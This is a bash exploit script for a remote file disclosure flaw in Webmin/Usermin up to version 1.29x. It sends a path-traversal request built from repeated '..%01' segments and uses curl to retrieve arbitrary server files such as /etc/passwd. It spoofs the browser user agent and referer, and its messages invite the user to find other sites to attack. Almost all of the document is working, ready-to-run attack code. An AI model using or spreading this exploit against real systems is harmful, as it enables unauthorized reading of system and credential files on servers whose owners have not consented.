#!/bin/bash
# Webmin|Usermin <= 1.29x Remote File Disclosure
# Re-Written in Bash fro shits and giggles :p
# Bash Author: Hood3dRob1n
# USAGE: ./webmin-lfd.sh <SITE.COM> <PORT> <FILE-U-WANT>
#        use full path for file you want
# EX: ./webmin-lfd.sh target.com 10000 /etc/passwd


# Start the magic
# CONFIGURATION SECTION
#<= CHANGE BELOW THIS AS NEEDED =>
# Junk and Temp Files Location for tmp storage while script does its thing
JUNK=/tmp
#<= CHANGE ABOVE THIS AS NEEDED =>

#VARIABLES
args=3
SITE="$1"
PORT="$2"
FILE="$3"
TARGET="$1:$2/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01$3"
STORAGE1=$(mktemp -p "$JUNK" -t fooooobarwebmin1.tmp.XXX)
#1=Opera, 2=Chrome, 3=FireFox, 4=IE
uagent1="Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00"
uagent2="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1"
uagent3="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"
uagent4="Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0"

#First a simple Bashtrap function to handle interupt (CTRL+C)
trap bashtrap INT

function bashtrap(){
	echo
	echo
	echo 'CTRL+C has been detected!.....shutting down now' | grep --color '.....shutting down now'
	rm -rf "$STORAGE1" 2> /dev/null
	#exit entire script if called
	exit;
}
#End bashtrap()

function usage_info(){
	echo
	echo "HR's Webmin|Usermin <= 1.29x Remote File Disclosure Exploiter" | grep --color -E 'HR||s||Webmin||Usermin||1||29x Remote File Disclosure Exploiter'
	echo
	echo "USAGE: $0 <SITE.COM> <PORT> <FILE-U-WANT>" | grep --color -E 'USAGE||'$0'||SITE||COM||PORT||FILE||U||WANT'
	echo "EX: $0 target.com 10000 /etc/passwd" | grep --color 'EX'
	echo
	exit;
}
#end usage_info()


function webusermin_attack(){
	echo
	echo "HR's Webmin|Usermin <= 1.29x Remote File Disclosure Exploiter" | grep --color -E 'HR||s||Webmin||Usermin||1||29x Remote File Disclosure Exploiter'
	echo
	echo "Preparing to snatch $FILE...." | grep --color "Preparing to snatch $FILE"
	echo "Sending payload to $SITE on port $PORT, hang tight...." | grep --color -E 'Sending payload to||on port||hang tight'
	echo
	curl --url $TARGET --ssl --retry 2 --retry-delay 3 --connect-timeout 3 --no-keepalive -s -e "http://www.google.com/q?=attack_of_the_file_snatchers" -A "$uagent3" -o "$STORAGE1"
	echo
	echo "Results for requested file: $FILE" | grep --color 'Results for requested file'
	echo
	grep -i "Error - File not found" "$STORAGE1" 2> /dev/null 2>&1
	if [ "$?" == 0 ]; then
		echo "Sorry, requested file was not found or there was a problem somewhere....."
		echo "Try another file or find another site to test..."
		exit;
	else
		cat "$STORAGE1"
	fi
	echo
	echo "Hope you found what you were looking for, until next time - Enjoy!" | grep --color -E 'Hope you found what you were looking for||until next time||Enjoy'
	echo
	exit;
}
# end webusermin_attack()


# MAIN --------------------------------------------
clear
# supply usage if not called properly
if [ -z "$1" ] || [ "$#" -ne "$args" ] || [ "$1" == "-h" ] ||  [ "$1" == "--help" ]; then
	usage_info
fi
webusermin_attack

rm -rf "$STORAGE1" 2> /dev/null
#EOF
